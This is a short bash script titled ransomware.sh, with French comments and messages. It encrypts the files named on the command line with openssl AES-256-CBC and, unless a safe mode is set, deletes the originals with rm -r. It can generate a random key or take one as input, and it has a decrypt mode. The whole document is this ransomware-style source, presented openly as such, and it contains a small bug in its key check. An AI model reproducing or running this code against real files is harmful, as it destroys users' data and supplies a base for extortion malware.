#!/bin/bash

usage() {
    echo "utilisation : encrypt : ./ransomware.sh -f -k <clé> fichier"
    echo "              decrypt : ./ransomware.sh -d -f -k <clé> fichier"
    echo "-f : les chemins fournis identifient les fichiers à (dé)chiffrer et plus les répertoires"
    echo "-k key : permet de spécifier la clé de chiffrement utilisée"
    echo "-s : active le 'safe mode' qui ne supprime pas les fichiers après les avoir déchiffrés   "
}



encrypt_file() {
    local path="$1"
    local key="$2"

    openssl enc -aes-256-cbc -salt -in "$path" -out "$path.enc" -k "$key"

    if [[ "$?" -eq 0 ]]; then
        echo "Le fichier $path a été chiffré avec succès."
        if [[ ! "$safe_mode" ]]; then
            rm -r "$path"
            echo "Le fichier original $path a été supprimé."
        fi
    else 
        echo "Une erreur s'est produite lors du chiffrement du fichier $path."
    fi
}

decrypt_file() {
    local path="$1"
    local key="$2"

    openssl enc -d -aes-256-cbc -salt -in "$path" -out "${path%.enc}" -k "$key"

    if [[ "$?" -eq 0 ]]; then
        echo "Le fichier $path a été déchiffré avec succès."
        if [[ ! "$safe_mode" ]]; then
            rm -r "$path"
            echo "Le fichier original $path a été supprimé."
        fi
    else 
        echo "Une erreur s'est produite lors du déchiffrement du fichier $path."
    fi
}

while getopts ":hdfk:s" opt; do
    case $opt in
        h )
            usage
            exit 0
            ;;
        d )
            decryption_mode=true
            ;;
        f )
            file_mode=true
            ;;
        k )
            key="$OPTARG"
            ;;
        s )
            safe_mode=true
            ;;
        \?)
            echo "Option invalide : -$OPTARG" >&2
            exit 1
            ;;
    esac
done

shift $((OPTIND - 1))

if [[ "$decryption_mode" ]]; then
    echo "Mode de déchiffrement activé."
    if [[ -z "key" ]]; then
        read -sp "Veuillez entrer la clé de déchiffrement : " key
        echo
    fi
else
    echo "Mode de chiffrement activé"
    if [[ -z "$key" ]]; then
        echo "Génération aléatoire de la clé de chiffrement."
        key=$(openssl rand -base64 32)
        echo "La clé de chiffrement généré est : $key"
    fi    
fi

if [[ "$file_mode" ]]; then
    for path in "$@"; do
        if [[ "$decryption_mode" ]]; then
            if [[ "$path" == *.enc ]]; then
                decrypt_file "$path" "$key"
            else 
                echo "Le fichier $path n'est pas un fichier chiffré."
            fi
        else
            encrypt_file "$path" "$key"
        fi
    done
else 
    echo "Option -f (fichiers) est obligatoire pour chiffrer/dechiffrer les répertoires"
    exit 1
fi















































